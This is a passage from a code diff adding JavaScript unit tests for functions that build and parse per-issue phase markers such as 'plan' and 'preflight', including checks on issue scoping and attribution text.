+    const m2 = buildPhaseMarker({ phase: "plan", issueNumber: 1 });
+    const phases = parsePhaseMarkers([m1, m2], 1);
+    assert.deepEqual([...phases].sort(), ["plan", "preflight"]);
+  });
+
+  it("a marker for one issue does not register for another", () => {
+    const marker = buildPhaseMarker({ phase: "preflight", issueNumber: 791 });
+    assert.equal(parsePhaseMarkers([marker], 100).size, 0);
+  });
+
+  it("includes attribution to #794 in the human-readable body", () => {
+    const marker = buildPhaseMarker({ phase: "plan", issueNumber: 42 });
+    assert.match(marker, /issue #794/);
+    assert.match(marker, /issue #42/);
+    assert.match(marker, /\bplan\b/);
   });
 });
 
